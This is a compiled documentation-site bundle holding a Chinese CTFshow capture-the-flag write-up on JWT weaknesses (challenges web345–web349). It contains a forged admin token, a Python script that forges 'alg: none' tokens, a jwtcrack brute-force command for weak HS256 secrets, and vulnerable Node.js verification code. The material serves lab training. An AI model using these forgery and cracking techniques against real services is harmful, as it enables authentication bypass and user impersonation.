"use strict";(self.webpackChunkmu_website=self.webpackChunkmu_website||[]).push([[8007],{164:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>d,contentTitle:()=>c,default:()=>h,frontMatter:()=>i,metadata:()=>a,toc:()=>o});var r=s(74848),t=s(28453);const i={},c=void 0,a={id:"Web/CTFshow\u5165\u95e8/jwt",title:"jwt",description:"\u8ba4\u8bc6JWT",source:"@site/docs/Web/CTFshow\u5165\u95e8/12-jwt.md",sourceDirName:"Web/CTFshow\u5165\u95e8",slug:"/Web/CTFshow\u5165\u95e8/jwt",permalink:"/docs/Web/CTFshow\u5165\u95e8/jwt",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Web/CTFshow\u5165\u95e8/12-jwt.md",tags:[],version:"current",sidebarPosition:12,frontMatter:{},sidebar:"Web",previous:{title:"nodejs",permalink:"/docs/Web/CTFshow\u5165\u95e8/nodejs"},next:{title:"SSRF",permalink:"/docs/Web/CTFshow\u5165\u95e8/SSRF"}},d={},o=[{value:"\u8ba4\u8bc6JWT",id:"\u8ba4\u8bc6jwt",level:3},{value:"web345",id:"web345",level:3},{value:"web346",id:"web346",level:3},{value:"web347",id:"web347",level:3},{value:"web348",id:"web348",level:3},{value:"web349",id:"web349",level:3}];function l(e){const n={a:"a",blockquote:"blockquote",code:"code",h3:"h3",img:"img",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h3,{id:"\u8ba4\u8bc6jwt",children:"\u8ba4\u8bc6JWT"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://www.baobao555.tech/posts/4cc42459/",children:"https://www.baobao555.tech/posts/4cc42459/"})}),"\n",(0,r.jsxs)(n.p,{children:["jwt\u5168\u79f0\u662f",(0,r.jsx)(n.code,{children:"JSON Web Token"}),"\uff0c\u80fd\u591f\u770b\u51fa\u6765\u91cd\u70b9\u63d0\u73b0\u5728Token\u4e0a"]}),"\n",(0,r.jsx)(n.p,{children:"jwt\u672c\u8d28\u662f\u4e00\u4e32\u5b57\u7b26\u4e32\uff0c\u5c06\u7528\u6237\u4fe1\u606f\u4fdd\u5b58\u5728\u4e00\u4e2ajson\u5b57\u7b26\u4e32\u4e2d\uff0c\u7136\u540e\u8fdb\u884c\u7f16\u7801\u5f97\u5230jwt token\uff0c\u8fd9\u4e2ajwt token\u542b\u6709\u7b7e\u540d\u4fe1\u606f\uff0c\u5728\u63a5\u53d7\u65f6\u53ef\u4ee5\u6548\u9a8c\u662f\u5426\u88ab\u7be1\u6539\u8fc7\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u8ba4\u8bc1\u6d41\u7a0b\uff1a"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsxs)(n.p,{children:["1.\u5c06\u524d\u7aef\u8f93\u5165\u7684\u8d26\u53f7\u5bc6\u7801\u53d1\u9001\u5230\u540e\u7aef\r\n2.\u540e\u7aef\u6838\u5bf9\u6210\u529f\u540e\uff0c\u5c06\u5305\u542b",(0,r.jsx)(n.code,{children:"\u7528\u6237\u4fe1\u606f"}),"\u7684\u6570\u636e\u4f5c\u4e3aJWT\u7684payload\uff0c\u4e0e",(0,r.jsx)(n.code,{children:"JWTHeader"}),"\u5206\u522bbase64\u7f16\u7801\u62fc\u63a5\u540e",(0,r.jsx)(n.code,{children:"\u7b7e\u540d"}),"\uff0c\u5f62\u6210JWT Token\uff0c\u8fd9\u4e2aToken\u5c31\u662f\u5982\u540caaa.bbb.ccc\u7684\u5b57\u7b26\u4e32(header\u3001payload\u4e0esignature)\r\n3.\u540e\u7aef\u5c06JWT Token\u4f5c\u4e3a\u767b\u5f55\u6210\u529f\u7ed3\u679c\u8fd4\u56de\u5230\u524d\u7aef\uff0c\u524d\u7aef\u53ef\u4ee5\u5c06\u8fd4\u56de\u7ed3\u679c\u4fdd\u5b58\u5728\u6d4f\u89c8\u5668\u4e2d\uff0c\u9000\u51fa\u767b\u5f55\u65f6\u5220\u9664JWT Token\u5373\u53ef\r\n4.\u524d\u7aef\u5728\u6bcf\u6b21\u8bf7\u6c42\u65f6\u5c06JWT Token\u653e\u5165HTTP Header\u7684Authorization\u5c5e\u6027\u4e2d\uff08\u80fd\u591f\u89e3\u51b3XSS\u548cXSRF\uff09\r\n5.\u540e\u7aef\u68c0\u67e5\u524d\u7aef\u4f20\u6765\u7684JWT Token\uff0c\u9a8c\u8bc1\u6709\u6548\u6027\uff0c\u5982\u68c0\u67e5\u662f\u5426\u88ab\u7be1\u6539\u3001\u662f\u5426\u8fc7\u671f\u7b49\r\n6.\u901a\u8fc7\u9a8c\u8bc1\u540e\uff0c\u540e\u7aef\u89e3\u6790\u5176\u4e2d\u7684\u7528\u6237\u4fe1\u606f\uff0c\u8fd4\u56de\u7ed3\u679c"]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"web345",children:"web345"}),"\n",(0,r.jsx)(n.p,{children:"\u6ce8\u91ca\u91cc\u5199\u4e86/admin"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20220119124946770",src:s(15323).A+"",width:"568",height:"404"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{href:"https://jwt.io/",children:"https://jwt.io/"})," jwt\u89e3\u7801\uff08\u5f53\u7136\u76f4\u63a5base64\u89e3\u7801\u4e5f\u884c\uff09"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20220119125341921",src:s(40309).A+"",width:"1296",height:"753"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u91cc\u9700\u8981sub\u4e5f\u4e3aadmin\uff0c\u4e8e\u662f\u628asub\u90a3\u91cc\u6539\u6210admin\u518dbase64\u7f16\u7801\u62fc\u63a5\u5c31\u53ef\u4ee5\u4e86\uff0c\u56e0\u4e3a\u53ea\u627e\u5230\u4e00\u4e2a\u70b9\uff0c\u6240\u4ee5\u6ca1\u6709\u7b7e\u540d\u90e8\u5206"}),"\n",(0,r.jsx)(n.p,{children:"\u7136\u540e\u7b2c\u4e00\u90e8\u5206\u7684None\u8981\u9009\u62e9\u4e00\u79cdAlgorithm\u65b9\u5f0f"}),"\n",(0,r.jsx)(n.p,{children:"\u4e8e\u662f\u5c31\u53ef\u4ee5\u5f97\u5230"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20220119191147085",src:s(16323).A+"",width:"1151",height:"652"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-payload",children:"eyJhbGciOiJIUzI1NiIsInR5cCI6Imp3dCJ9.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NDI1ODkzNzcsImV4cCI6MTY0MjU5NjU3NywibmJmIjoxNjQyNTg5Mzc3LCJzdWIiOiJhZG1pbiIsImp0aSI6IjlmNzE1MTQzMzVjZWYwMDEzZGI1NjI5NzY1ODVlZDZlIn1d.ekl_GdtUhkyFJlyFsSkM16tF8k6aDxNKeH8XR2nVNF0\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u53d1\u5305"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20220119191204184",src:s(13783).A+"",width:"983",height:"406"})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u8fd9\u91cc\u4e00\u8d77\u8bf4\uff0c\u8c22\u8c22\u5357\u795e\u8001\u5e08\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"web346",children:"web346"}),"\n",(0,r.jsx)(n.p,{children:"\u62ff\u5230token\uff0c\u89e3\u4e00\u4e0b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-token",children:'{\r\n  "alg": "HS256",\r\n  "typ": "JWT"\r\n}\r\n{\r\n  "iss": "admin",\r\n  "iat": 1642590769,\r\n  "exp": 1642597969,\r\n  "nbf": 1642590769,\r\n  "sub": "user",\r\n  "jti": "35c454cf45802fb46a076d63a6c4a5de"\r\n}\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u91cc\u8003\u70b9\u662f",(0,r.jsx)(n.code,{children:"JWT\u652f\u6301\u5c06\u7b97\u6cd5\u8bbe\u5b9a\u4e3a\u201cNone\u201d\u3002\u5982\u679c\u201calg\u201d\u5b57\u6bb5\u8bbe\u4e3a\u201c None\u201d\uff0c\u90a3\u4e48\u7b7e\u540d\u4f1a\u88ab\u7f6e\u7a7a\uff0c\u8fd9\u6837\u4efb\u4f55token\u90fd\u662f\u6709\u6548\u7684\u3002 \u8bbe\u5b9a\u8be5\u529f\u80fd\u7684\u6700\u521d\u76ee\u7684\u662f\u4e3a\u4e86\u65b9\u4fbf\u8c03\u8bd5\u3002\u4f46\u662f\uff0c\u82e5\u4e0d\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u5173\u95ed\u8be5\u529f\u80fd\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5c06alg\u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u201cNone\u201d\u6765\u4f2a\u9020\u4ed6\u4eec\u60f3\u8981\u7684\u4efb\u4f55token\uff0c\u63a5\u7740\u4fbf\u53ef\u4ee5\u4f7f\u7528\u4f2a\u9020\u7684token\u5192\u5145\u4efb\u610f\u7528\u6237\u767b\u9646\u7f51\u7ad9\u3002"})]}),"\n",(0,r.jsx)(n.p,{children:"\u4f46\u662f\u4e0a\u9762\u90a3\u4e2a\u7f51\u7ad9\u4e0d\u652f\u6301None\uff0c\u6240\u4ee5\u8fd9\u91cc\u7528python\u6765\u751f\u6210"}),"\n",(0,r.jsx)(n.p,{children:"\u6ce8\u610fimport jwt\uff0c\u8fd9\u4e2ajwt\u4e0d\u662fpip install jwt\uff0c\u800c\u662fpip install PyJWT"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'import jwt\r\n\r\n# payload\u6ce8\u610f\u6362\u6210\u81ea\u5df1\u7684\r\ntoken_dict = {\r\n  "iss": "admin",\r\n  "iat": 1642590769,\r\n  "exp": 1642597969,\r\n  "nbf": 1642590769,\r\n  "sub": "admin",\r\n  "jti": "35c454cf45802fb46a076d63a6c4a5de"\r\n}\r\n\r\nheaders = {\r\n  "alg": "none",\r\n  "typ": "JWT"\r\n}\r\njwt_token = jwt.encode(token_dict,"",algorithm="none",headers=headers) #payload,\u79d8\u94a5,\u7b97\u6cd5\u65b9\u5f0f,headers\r\n\r\nprint(jwt_token)\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20220119192136843",src:s(45178).A+"",width:"1036",height:"369"})}),"\n",(0,r.jsx)(n.h3,{id:"web347",children:"web347"}),"\n",(0,r.jsxs)(n.p,{children:["\u9898\u76ee\u8bf4\u5f31\u53e3\u4ee4\uff0c\u8fd9\u91cc\u4f7f\u7528\u5de5\u5177",(0,r.jsx)(n.a,{href:"https://github.com/brendan-rius/c-jwt-cracker%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4%EF%BC%8C%E5%AE%89%E8%A3%85%E6%96%B9%E5%BC%8F%E6%96%87%E6%A1%A3%E6%9C%89",children:"https://github.com/brendan-rius/c-jwt-cracker\u8fdb\u884c\u7206\u7834\uff0c\u5b89\u88c5\u65b9\u5f0f\u6587\u6863\u6709"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20220119193238984",src:s(13506).A+"",width:"1706",height:"74"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u91cc\u6211\u4ece1\u5f04\u5230\u4e866"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-payload",children:"./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0MjU5MTYyMiwiZXhwIjoxNjQyNTk4ODIyLCJuYmYiOjE2NDI1OTE2MjIsInN1YiI6InVzZXIiLCJqdGkiOiJkZjkwZWM3NGY2OTViZWMzMzI4MDM2YTVhODg0YzFlZSJ9.pRmSxMZQ0VCfhuZedwQYnRTpB16Xy0U0xgSrGi3qhS8 0123456789 6 sha256\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u65e2\u7136\u627e\u5230\u4e86\u5bc6\u7801\uff0c\u90a3\u4e48\u5c31\u53ea\u9700\u8981\u7528\u4e0a\u9762\u7684jwt\u89e3\u7801\u7f51\u7ad9\u89e3\u4e00\u4e0b\u7136\u540e\u6539\u4e00\u4e0b\u518dencode\u5c31\u53ef\u4ee5\u4e86"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20220119193420382",src:s(45225).A+"",width:"1210",height:"720"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20220119193527173",src:s(56733).A+"",width:"1065",height:"419"})}),"\n",(0,r.jsx)(n.h3,{id:"web348",children:"web348"}),"\n",(0,r.jsx)(n.p,{children:"348\u662f\u7eaf\u7206\u7834\uff0c\u90a3\u5c31\u4e0d\u6307\u5b9a\uff0c\u76f4\u63a5\u7206"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20220119193648025",src:s(16595).A+"",width:"1702",height:"76"})}),"\n",(0,r.jsx)(n.p,{children:"\u7b7e\u540d\u662faaab\uff0c\u64cd\u4f5c\u65b9\u6cd5\u540c\u4e0a"}),"\n",(0,r.jsx)(n.h3,{id:"web349",children:"web349"}),"\n",(0,r.jsx)(n.p,{children:"\u7ed9\u4e86\u4e2aapp.js"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-js",children:"/* GET home page. */\r\nrouter.get('/', function(req, res, next) {\r\n  res.type('html');\r\n  var privateKey = fs.readFileSync(process.cwd()+'//public//private.key');\r\n  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });\r\n  res.cookie('auth',token);\r\n  res.end('where is flag?');\r\n  \r\n});\r\n\r\nrouter.post('/',function(req,res,next){\r\n\tvar flag=\"flag_here\";\r\n\tres.type('html');\r\n\tvar auth = req.cookies.auth;\r\n\tvar cert = fs.readFileSync(process.cwd()+'//public/public.key');  // get public key\r\n\tjwt.verify(auth, cert, function(err, decoded) {\r\n\t  if(decoded.user==='admin'){\r\n\t  \tres.end(flag);\r\n\t  }else{\r\n\t  \tres.end('you are not admin');\r\n\t  }\r\n\t});\r\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u91cc\u7ed9\u4e86public.key\u548cprivate.key\u7684\u4f4d\u7f6e\uff0c\u76f4\u63a5\u8bbf\u95ee\u4e0b\u8f7d"})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(l,{...e})}):l(e)}},15323:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image-20220119124946770-ad105be4509c5cc41dbbff7f5a9d87c4.png"},40309:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image-20220119125341921-519fc756e49f8491422e9e4d57b96588.png"},16323:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image-20220119191147085-59a2a04bc5b5dda267cf40d40181afcc.png"},13783:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image-20220119191204184-11c871e7f91864563bef9de6af9b8078.png"},45178:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image-20220119192136843-b105b6a5130ddc996d118d420ecc763a.png"},13506:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image-20220119193238984-6172efc7d1b0b1e3545ff75dc076f963.png"},45225:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image-20220119193420382-275af322b340072350b263cb2faae938.png"},56733:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image-20220119193527173-44fc53f56876f05bf4dedd3f1a81827f.png"},16595:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/image-20220119193648025-8eccd27f360a1e113c346803f5fd0fc7.png"},28453:(e,n,s)=>{s.d(n,{R:()=>c,x:()=>a});var r=s(96540);const t={},i=r.createContext(t);function c(e){const n=r.useContext(i);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:c(e.components),r.createElement(i.Provider,{value:n},e.children)}}}]);